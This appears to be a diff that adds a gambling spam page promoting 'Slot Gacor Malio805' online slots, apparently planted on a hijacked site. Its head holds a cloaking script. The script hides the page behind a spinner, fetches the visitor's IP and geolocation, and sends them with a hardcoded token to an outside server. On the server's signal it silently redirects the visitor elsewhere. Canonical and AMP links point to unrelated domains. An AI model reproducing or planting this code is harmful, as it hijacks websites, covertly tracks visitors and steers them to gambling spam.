@@ -1,0 +1,134 @@
+<html>
+<head>
+    <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '742780898424689');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=742780898424689&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2646781889014675');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2646781889014675&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2786891624848410');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2786891624848410&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    <meta name="value" content="r24ne004pv">
+<meta name="token" content="k9RWsR3z4NwgPGyqjYejFgvsgNF00ZvzMutnVBv643jdFEXJa745voIGUk5f">
+<meta name="uri" content="https://pandawa.jual-akun.com/api/v1/kucing">
+<style>
+    .classldingBG{display: flex !important; z-index: 999999 !important; background: #fff; position: fixed; align-items: center; justify-content: center; top: 0; left: 0; width: 100%; height: 100%;}
+    .pik_spinner { -webkit-animation: rotator 1.4s linear infinite; animation: rotator 1.4s linear infinite; } @-webkit-keyframes rotator { 0% { transform: rotate(0deg); } 100% { transform: rotate(270deg); } } @keyframes  rotator { 0% { transform: rotate(0deg); } 100% { transform: rotate(270deg); } } .pik_path { stroke-dasharray: 187; stroke-dashoffset: 0; transform-origin: center; -webkit-animation: dash 1.4s ease-in-out infinite, colors 5.6s ease-in-out infinite; animation: dash 1.4s ease-in-out infinite, colors 5.6s ease-in-out infinite; } @-webkit-keyframes colors { 0% { stroke: #4285F4; } 25% { stroke: #DE3E35; } 50% { stroke: #F7C223; } 75% { stroke: #1B9A59; } 100% { stroke: #4285F4; } } @keyframes  colors { 0% { stroke: #4285F4; } 25% { stroke: #DE3E35; } 50% { stroke: #F7C223; } 75% { stroke: #1B9A59; } 100% { stroke: #4285F4; } } @-webkit-keyframes dash { 0% { stroke-dashoffset: 187; } 50% { stroke-dashoffset: 46.75; transform: rotate(135deg); } 100% { stroke-dashoffset: 187; transform: rotate(450deg); } } @keyframes  dash { 0% { stroke-dashoffset: 187; } 50% { stroke-dashoffset: 46.75; transform: rotate(135deg); } 100% { stroke-dashoffset: 187; transform: rotate(450deg); } }
+    .fadeout {z-index: -1 !important; opacity: 0; display: none !important;}
+</style>
+<script type="text/javascript">
+    //add element
+
+    document.write(
+        '<div class="classldingBG" id="ldingBG"><div class="pik_bodyspiner"> <svg class="pik_spinner" width="65px" height="65px" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg"> <circle class="pik_path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle> </svg> </div></div></div>'
+    );
+        fetch("https://ipapi.co/json" , {
+                    method: 'GET',
+                })
+                //respons ip locate
+                .then((ip_locate) => ip_locate.json())
+                .then((ress_locator) => {
+                    //send request to server
+                    var ip = ress_locator.ip
+                    fetch("https://pandawa.jual-akun.com/api/v1/kucing", {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'value': 'r24ne004pv',
+                            'ip': ip,
+                            'api': JSON.stringify(ress_locator)
+                        },
+                        body: 'token=k9RWsR3z4NwgPGyqjYejFgvsgNF00ZvzMutnVBv643jdFEXJa745voIGUk5f',
+                        redirect: 'follow'
+
+                    }).then(function(response_api) {
+                        return response_api.json();
+
+                    }).then(respon_api => {
+                        var status = respon_api.result;
+                        if (status == false) {
+                            document.getElementById('ldingBG').classList.add("fadeout");
+                        } else if (status == true) {
+                            //response from server json
+                            setTimeout(function() {
+                                window.location.href = respon_api.data.url;
+                            }, 100);
+
+                        }
+                    }).catch((error) => {
+                         document.getElementById('ldingBG').classList.add("fadeout");
+                    });
+
+
+
+                })
+</script>
+                        
+<title>Slot Gacor Malio805</title>
+<meta name="google-site-verification" content="Jq9l5cKQwnUMxq3qVa_vk7EBgwLux8IWINSoLjGGvvI" />
+<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<meta name="robots" content="index, follow">
+<meta name="googlebot" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<meta name="yandex" content="index, follow">
+<meta name="baiduspider" content="index, follow">
+<meta name="google-site-verification" content="-_49xrHXg1wXltM3DkcMLUqiPum8ITcJh0MZaa0MhKc" />
+<link rel="canonical" href="https://elementmag.asia/" />
+<link rel="amphtml" href="https://amp.trisaktii.ac.id/" />
+<style>
+        html { background: black; color: lime; text-align: center; }
+    </style>
+</head>
+<body>
+<br /><br /><br />
+<br /><br /><br />
+<h1>Slot Gacor Malio805</h1>
+<br />
+<b>Slot Gacor <font color="orange">malio805</font> paling gacor !!<br /><br />
+menang dan maxwin di <a href="https://link.grup805.info/" style="color:yellow; text-decoration: none;">Malio805 Slot Gacor</a></b>
+<br /><br /><br />
+</body>
+</html>
